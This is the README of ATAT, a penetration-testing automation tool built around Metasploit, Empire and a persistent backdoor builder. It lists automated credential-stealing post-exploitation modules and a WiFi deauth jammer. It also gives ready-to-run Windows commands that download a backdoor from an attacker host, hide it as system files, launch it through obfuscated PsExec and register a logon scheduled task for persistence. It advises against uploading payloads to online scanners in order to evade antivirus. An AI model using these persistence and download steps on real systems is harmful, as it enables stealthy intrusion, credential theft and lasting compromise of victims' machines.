***RTFM***RTFM***RTFM***RTFM***

Run all dependency checker options to install all necessary tools before submitting any issues!

# ATAT
Attack Team Automation Tool for automating penetration testing operations. Based on ezsploit by rand0m1ze. Durandal backdoor builder created by Travis Weathers (Skysploit).

v1.9.3.3
Added support for parsing Nmap output to feed SSLScan
Added Automated File Push and Exfiltration support
Added support for Bloodhound
Added support for HostAPD-WPE, Asleap, John the Ripper, & Airgeddon Integration,
Added Powershell Empire & DeathStar Integration,
Added support for Apache Struts/Tomcat/Etc. exploits,
Added support for Java JMX exploitation,
Added support for Java RMI exploitation,
Added support for linux post exploitation,
Added support for load balancer detection,
Added support for SSLScan (automated via masscan results),
Added support for Masscan of all TCP ports (informs SSLScan),
Added Android persistent reverse Meterpreter APK builder,
Added DBD persistent backdoor builder by Skysploit with enhanced persistence instructions,
Added dependency checker by Skysploit,
Added fully automated MSF Post Exploitation on all sessions acquired for the following post ex activities:
- enumerate hosts
- dump cached domain creds
- verify if you are on a vm
- group policy preferences (dump local admin creds if pushed via GPO)
- steal SVN creds (code repository)
- steal scp creds
- enumerate internal sites the user visits
- all apps installed on target
- Chrome, dump cookies, and saved creds
- IE, dump cookies, and saved creds
- Firefox, dump cookies, and saved creds
- grab RDP sessions
- grab local settings and local accounts
- dumps WPA PSK & WEP passwords
- dumps passwords on the local windows system including domain accounts
- dump .ssh directory for known hosts
- gather OS environment variables
- dump /etc/shadow
- dump user list plus bash/mysql/vim/lastlog/sudoers history
- enum packages, services, mounts, user list, bash
- check for AV, rootkit, HIDS/HIPS, firewalls, etc
- dump IPTables, interfaces, wifi info, open ports
- collect config files for commonly installed apps and services
- grab arp table from target
- enumerate the domain, domain users, and domain tokens
- grab the host file
- dump logged on users
- dump MS product keys
- steal VNC creds
- enumerate services & shares on target
- steal SNMP inforamtion
- dump DNS cache
- steal GPG credentials/certificates
- grab the history of mounted USB devices
- assess the target and suggest local exploits for privilege escalation or other operations

!!NOT RECOMMENDED!!--- INSTRUCTIONS TO RUN THIS FROM /home/<profile>/ instead of running as root (Doing this will break Empire & DeathStar functionality as well as some Wireless Attacks functionality)---
The ATAT folder must be duplicated in /root & ~/ to run properly unless you are on Kali (logged in as root) or you are running
another distro logged in as root (duplicating this folder only needs to be done once and does not need to be updated ever).
You then do not have to run the script from /root if you place one copy of the ATAT folder in ~/ and one copy in /root.
Placing a copy of the ATAT folder in /root/ in this circumstance is only so you have the TXT files 
accessible by ATAT when it run as sudo. Then you simply run ATAT via sudo ./ATAT.sh from ~/ATAT.
All targets and/or ports must be added into their respective TXT files in /root/ as referenced above and detailed below.
Adding your targets/ports to the TXT files in ~/ATAT will not work under this setup
*You can (and should) have the ATAT folder in /root only if you wish; and you can run it from there disregarding all of these instructions.*

usage:
chmod +x ~/ATAT/ATAT.sh
cd ATAT
sudo ./ATAT.sh

You MUST load your PORTS or IPs into their appropriate TXT files for options listed below to work! (one per line)

OPTION Multi-Target:
/root/ATAT/MSF_targets.txt

OPTION Multi-Port:
/root/ATAT/MSF_target_ports.txt

OPTION Multi-Port Auxiliary:
/root/ATAT/MSF_AUX_target_ports.txt

OPTION Multi-Target Struts & Multi-Target Tomcat:
/root/ATAT/MSF_targets.txt

OPTION Multi_target Java JMX & Multi-Target Java RMI:
/root/ATAT/MSF_targets.txt

OPTION Multi-Target SNMP Enumeration:
/root/ATAT/MSF_targets.txt

OPTION Multi-Target Load Balancer Detection:
/root/ATAT/MSF_targets.txt
Results output to screen and the ATAT folder in LBD_Results.txt.
OUTPUT FILES APPEND DATA DUE TO THE NATURE OF THESE LOOPED OPERATIONS; THEREFORE, ALL OUTPUT FILES MUST BE DELETED OR CLEANED OUT PERIODICALLY TO GET RID OF PREVIOUS SCANS' RESULTS

OPTION Multi-Target SSLScan:
/root/ATAT/MSF_targets.txt
Targets can be entered as just IPs/URLs for scanning on the default port 443; or you can enter colon delimited lists to specify the port to scan each target on as follows:
1.2.3.4:22
1.2.3.4:8443
1.3.4.5:990
1.3.4.5:547
Results output to screen and the ATAT folder in SSLScan_Results.txt. All output is further processed and grouped into the following categories:
RC4 findings in rc4.txt
SSLv2 findings in sslv2.txt
Heartbleed Findings in heartbleed_targets.txt
Freak vuln findings in freak.txt
Weak Cipher Findings in weak_ciphers.txt
Expired Certificate Findings in expired_certs.txt
SSL Certificate Details in ssl_certs.txt

Masscan results also output to ~SSLScan_masscan_results.txt and the Nmap parsing outputs results to SSLScan_nmap_results.txt. These files contain all targets and discovered ports colon delimited one per line as above.
"Multi-Target SSLScan - With Masscan Results" can be run automatically after running masscan to check for SSL issues on all discovered ports on every host in scope effortlessly.
If masscan isn't providing you with the data you need or you would rather use Nmap output you may use a save XML or TXT Nmap output file that was run with one of the "Intense" profiles (meaning -T4 -A -v parameters used in scan syntax).
Simply use the "Extract All IP:Port Combos From Nmap Output For SSLScan Processing" option to process the Nmap output first and then use the "Multi-Target SSLScan - With Nmap Results" option to automatically run SSLScan against all targets and their identified open ports.
All options output SSLScan results to: ~SSLScan_Results.txt
OUTPUT FILES APPEND DATA DUE TO THE NATURE OF THESE LOOPED OPERATIONS; THEREFORE, ALL OUTPUT FILES MUST BE DELETED OR CLEANED OUT PERIODICALLY TO GET RID OF PREVIOUS SCANS' RESULTS

OPTION Masscan All TCP Ports:
/root/ATAT/MSF_targets.txt
This masscans all TCP ports for all targets at a reasonable rate (--rate 1000)
Results output to screen and the ATAT folder in Open_Ports.txt.
Masscan results also output to ~SSLScan_masscan_results.txt. This file contains all targets and discovered ports colon delimited one per line as follows:
1.2.3.4:22
1.2.3.4:8443
1.3.4.5:990
1.3.4.5:547
SSLScan can be run automatically after running masscan to check for SSL issues on all discovered ports on every host in scope effortlessly.
OUTPUT FILES APPEND DATA DUE TO THE NATURE OF THESE LOOPED OPERATIONS; THEREFORE, ALL OUTPUT FILES MUST BE DELETED OR CLEANED OUT PERIODICALLY TO GET RID OF PREVIOUS SCANS' RESULTS

OPTION Dependency Checker:
Dependencies option will attempt to install the required dependencies for ATAT. DBD Installer option must be run on your attacker box in order to receive DBD reverse shells.
Powershell Empire & DeathStar Option Should Only Be Run If You Are Logged In As root!!

OPTION Persistence:
PLEASE DO NOT submit payloads generated to virustotal or any other online scanner!!
DBD reverse shells will self heal a dropped connection in 10 minute intervals. If the connection is killed on either end or is lost for any reason, the connection will reconnect after a 10 minute period. All sessions are 128bit AES encrypted.

WINDOWS:
ATAT creates a taskmgnt.txt & winmgnt.txt for Windows DBD builder option payloads and places them in the /var/www/html/ directory before starting Apache on the attacker's machine (to host the payloads for access by the target machines). Both of these TXT files must be converted to EXE format once they have been transmitted to the target. Taskmgnt(nominally obfuscated PSEXEC) can be used to execute the winmgnt (DBD backdoor) so it is executed by a MS signed binary for more stealth/evasion. DBD itself is not currently flagged by any AV; but sometimes it is necessary to have your EXE run by a MS signed binary.
Windows deployment instructions for reboot persistence:
Option "DBD Reboot Persistence Generator - Windows" will create the following BAT file with all of these steps and places it here: ~/ATAT/DBD_reboot.bat (You must have a SYSTEM shell, upload the BAT file to the %WINDIR%\System32\ directory, and run DBD_reboot.bat from the same directory)
Now move the "taskmgnt.txt" & "winmgnt.txt" files to the target, rename & hide them, then launch backdoor with MS signed ofuscated PsExec.
While this backdoor is self healing; it will not auto start at reboot. To get your shell back after a reboot, enter the following on the target (one command per line):

powershell (new-object System.Net.WebClient).DownloadFile('http://<ATTACKER_IPADDRESS>/winmgnt.txt','%WINDIR%\System32\winmgnt.exe')
powershell (new-object System.Net.WebClient).DownloadFile('http://<ATTACKER_IPADDRESS>/taskmgnt.txt','%WINDIR%\System32\taskmgnt.exe')
attrib +H +S \"%WINDIR%\System32\winmgnt.exe\"
attrib +H +S \"%WINDIR%\System32\taskmgnt.exe\"
%WINDIR%\System32\taskmgnt.exe -i -d -s /accepteula %WINDIR%\System32\winmgnt.exe
schtasks /create /sc onlogon /tn WindowsMgr /rl highest /tr \"%WINDIR%\System32\winmgnt.exe\"

*NIX:
ATAT creates a 'dbd' binary for *nix DBD builder option payloads and places it in the /var/www/html/ directory. 

For post exploitation once you acquire sessions via ATAT,

METHOD 1: 
Launch your listener with menu option 2. ATAT will intelligently detect the appropriate post modules to run against each session you receive.  However, due to a bug in the MSF AutoRunScript feature you must do the following: From your listener window, after all of your sessions are in (after your attacks have completed) hit enter to drop down to your msf expoit(multi/handler)> prompt and then enter the following command without double quotes: "resource '/root/ATAT/ATAT_multi_post.rc'" Check your loot files in /root/.msf4/loot/

METHOD 2:
This will be updated once the aforementioned feature has been fixed by Rapid7.

OPTION Empire & DeathStar:
THIS SECTION ONLY WORKS FROM THE /root/ CONTEXT!!
IF YOU'RE NOT LOGGED IN AS root, DO NOT USE THESE OPTIONS!!
Empire & DeathStar MUST be installed in /root/!!
Only Launch DeathStar (Step 2) If Your Goal Is To Automate Domain Admin Credential Acquisition

Step 1 must br run initially; after that you need to open another ATAT instance in a separate window and launch Step 2 to use DeathStar for domain admin credential acquisition automation. Run Step 3 to get the auth token for PSE's REST API; this is required for all other PSE options to work.
Step 3 MUST be run once (and only once for a single PSE install; meaning you only need to run it again if you uninstall/reinstall, or you are using ATAT's PSE options to hit a PSE install on a separate machine). This step grabs the permanent auth token for the PSE REST API. You must use the temporary auth token displayed in the PSE console at startup to run this process. After this step you will not longer need to worry about the API auth token (this is stored in plaintext in your ATAT directory, delete ~/ATAT/PSE_perm_token.txt after your operation and re-run step 3 at the begninning of each operation to enhance opsec).
Post exploitation features are a work in progress!
Better support and information for stagers will be provided as support for them grows.

OPTION Wireless Attacks:
1) Remove Wireless NIC from Network Manager - Removes the NIC you wish to use in a HostAPD-WPE attack from being managed by NetworkManager. This is essential for the attack to work.
2) Reset Wireless NIC for Network Manager Usage - Allows NetworkManager to manage your wireless NIC after your attack is complete. This allows you to join wireless networks and operate the wireless NIC normally.
3) HostAPD-WPE Enterprise WiFi Fake RADIUS Server Attack - Performs HostAPD-WPE attack to capture enterprise WPA credentials for cracking with Asleap option.
The RTL8187 or Alfa AWUS036H is, sadly, NOT supported. Also, your wireless chipset is likely not supported by HostAPD-WPE if you receive this error:
Configuration file: /etc/hostapd-wpe/hostapd-wpe2.conf
nl80211: Could not configure driver mode
nl80211: deinit ifname=wlan0 disabled_11b_rates=0 
nl80211 driver initialization failed. 
wlan0: interface state UNINITIALIZED->DISABLED 
wlan0: AP-DISABLED 
hostapd_free_hapd_data: Interface wlan0 wasn't started

4) Airgeddon - Launch airgeddon wireless script by v1s1t0r
5) Multi-Target Asleap Attack - Perform dictionary attack against all users captured by the HostAPD-WPE attack. (better for fewer targets because usernames aren't paired with passwords in the output file)
OUTPUT FILES APPEND DATA DUE TO THE NATURE OF THESE LOOPED OPERATIONS; THEREFORE, ALL OUTPUT FILES MUST BE DELETED OR CLEANED OUT PERIODICALLY TO GET RID OF PREVIOUS OPERATION'S RESULTS
6) Multi-Target John The Ripper Attack - Perform dictionary attack against all users captured by the HostAPD-WPE attack.
7) WiFi Jammer - *This Attack Is ILLEGAL If Not Conducted In A Controlled Environment That Is Free Of Networks That Are Not In Scope!! Use Responsibly & With Great Caution!* This is a an automated deauth attack that detects all access points & clients in range. This attack will hold down the 'user defined number' of closest clients indefinitely. A Yagi is recommended for long range, more percise targeting.
